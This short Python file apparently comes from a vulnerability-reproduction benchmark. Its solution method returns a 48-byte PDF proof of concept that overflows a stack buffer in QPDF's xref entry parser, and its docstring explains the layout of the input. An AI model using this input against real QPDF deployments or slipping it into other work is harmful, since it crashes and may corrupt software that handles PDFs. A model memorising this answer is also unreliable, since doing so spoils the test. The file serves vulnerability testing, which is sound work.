import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the stack buffer overflow in QPDF::read_xrefEntry.
        The vulnerability is caused by overlong f1 or f2 entries consisting only of zeros.
        
        Ground-truth PoC length is 48 bytes.
        
        Structure:
        - PDF Header: %PDF-1.0\n (9 bytes)
        - Xref keyword: xref\n (5 bytes)
        - Subsection header: 0 1\n (4 bytes)
        - Overlong entry: 30 zeros (30 bytes)
        
        Total: 9 + 5 + 4 + 30 = 48 bytes.
        """
        return b"%PDF-1.0\nxref\n0 1\n" + b"0" * 30
